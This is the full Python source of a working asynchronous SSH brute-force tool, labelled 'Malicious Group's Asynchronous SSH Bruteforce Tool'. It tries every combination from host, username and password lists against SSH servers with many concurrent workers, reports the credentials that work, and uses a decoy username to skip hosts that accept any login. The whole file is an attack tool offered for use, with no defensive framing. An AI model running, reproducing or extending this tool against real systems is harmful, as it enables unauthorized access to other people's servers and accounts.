import itertools
import asyncssh
import argparse
import logging
import asyncio
import socket
import signal
import random
import time

from sys import argv
from pathlib import Path

log = logging.basicConfig(format='sshtfu 🠖 %(message)s', level=logging.WARNING)


class SshTFU:

    def __init__(self, hf, uf, pf, workers):

        self._hf = self._return_list(hf)
        self._uf = self._return_list(uf)
        self._pf = self._return_list(pf)
        self._workers = int(workers)
        self._timeout_list = []
        self._ignore_list = []
        self._found_list = []
        self._found = 0
        self._queue_size = 0
        self._dead_user = ["MALICI0USUS3R"]

    @staticmethod
    def _return_list(item):
        stub = []
        config = Path(item)
        if config.is_file():
            for x in open(item):
                stub.append(x.rstrip())
            return stub
        else:
            stub.append(str(item).rstrip())
            return stub

    def _interrupt_handler(self, sig, frame):
        print(f"\nControl-C Detected.  There are {self._found} items found and {self._queue_size} left in the queue.\n")

    @staticmethod
    async def time_sleep(t):
        await asyncio.sleep(t)

    async def producer(self, queue):
        while True:
            items = list(itertools.product(self._hf, self._uf, self._pf))
            random.shuffle(items)

            false_positive = list(itertools.product(self._hf, self._dead_user, self._pf))
            for x in false_positive:
                items.insert(0, x)
            for h, u, p in items:
                queue.put_nowait((h, u, p))
            print(f"Starting {self._workers} workers to parse {len(items)} credential pairs...")
            break

    async def consumer(self, queue):
        while True:
            h, u, p = await queue.get()
            if h in self._ignore_list:
                queue.task_done()
                continue
            self._queue_size = queue.qsize()
            print(f"{queue.qsize()} Attempting attack on {h:16} - ( {u} : {p} )                             \r", end='')
            try:
                port = int(h.split(":")[1])
            except IndexError:
                port = 22
            while True:
                try:
                    await asyncio.wait_for(
                        asyncssh.connect(h, username=u, password=p, port=port, known_hosts=None), timeout=5)
                    if u is ''.join(self._dead_user):
                        if h not in self._ignore_list:
                            self._ignore_list.append(h)
                        break
                    print(f" 🠖 Credentials Found: {h:16} - ({u}:{p})                                                  ")
                    self._found += 1
                except asyncssh.PermissionDenied:
                    break
                except (asyncio.TimeoutError, TimeoutError):
                    if h in self._timeout_list:
                        if h not in self._ignore_list:
                            self._ignore_list.append(h)
                            break
                    elif h not in self._timeout_list:
                        self._timeout_list.append(h)
                except asyncssh.ProtocolError as e:
                    break
                except socket.error as e:
                    if e.args[0] == 104 or 111:
                        if h in self._timeout_list:
                            if h not in self._ignore_list:
                                self._ignore_list.append(h)
                                break
                        elif h not in self._timeout_list:
                            self._timeout_list.append(h)
                except Exception:
                    continue
                break
            queue.task_done()

    async def main(self):
        workers = self._workers
        queue = asyncio.Queue()
        signal.signal(signal.SIGINT, self._interrupt_handler)
        producers = [asyncio.create_task(self.producer(queue))]
        consumers = [asyncio.create_task(self.consumer(queue)) for _ in range(workers)]
        await asyncio.gather(*producers)
        await queue.join()
        for c in consumers:
            c.cancel()


def usage():
    u = f"""
    USAGE:
      {argv[0]} -h "192.168.1.1" -u "admin" -p /path/passwords.txt
      {argv[0]} -h "192.168.1.1:2222" -u "admin" -p /path/passwords.txt
      {argv[0]} -h /path/hosts.txt -u /path/users.txt -p /path/passwords.txt
      {argv[0]} -h /path/hosts.txt -u /path/users.txt -p /path/passwords.txt -w 20

    OPTIONS:
      '-h', '--hosts'      - Set the hostname or path to file containing hostnames.
      '-u', '--users'      - Set the username or path to file containing users.
      '-p', '--passwords'  - Set the password or path to file containing passwords.
      '-w', '--workers'    - Set the number of workers to run during attempts.

    """
    print(u)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(add_help=False, usage=usage)
    parser.add_argument('-h', '--host', action='store', dest='hosts', default='')
    parser.add_argument('-u', '--users', action='store', dest='users', default='')
    parser.add_argument('-p', '--passwords', action='store', dest='passwords', default='')
    parser.add_argument('-w', '--workers', action='store', dest='workers', default='')
    arg = None

    try:
        arg = parser.parse_args()
    except TypeError:
        usage()
        exit("Invalid options provided. Exiting.")

    if not arg.hosts or not arg.users or not arg.passwords:
        usage()
        exit()

    if not arg.workers:
        arg.workers = 10

    print(f"\n[ Malicious Group's Asynchronous SSH Bruteforce Tool ]\n")
    t = time.process_time()

    MaliciousGroup = SshTFU(arg.hosts, arg.users, arg.passwords, int(arg.workers))
    asyncio.run(MaliciousGroup.main())

    elapsed_time = time.process_time() - t
    print(f"All {arg.workers} Workers Completed! {MaliciousGroup._found} credentials found in {elapsed_time} seconds \n")
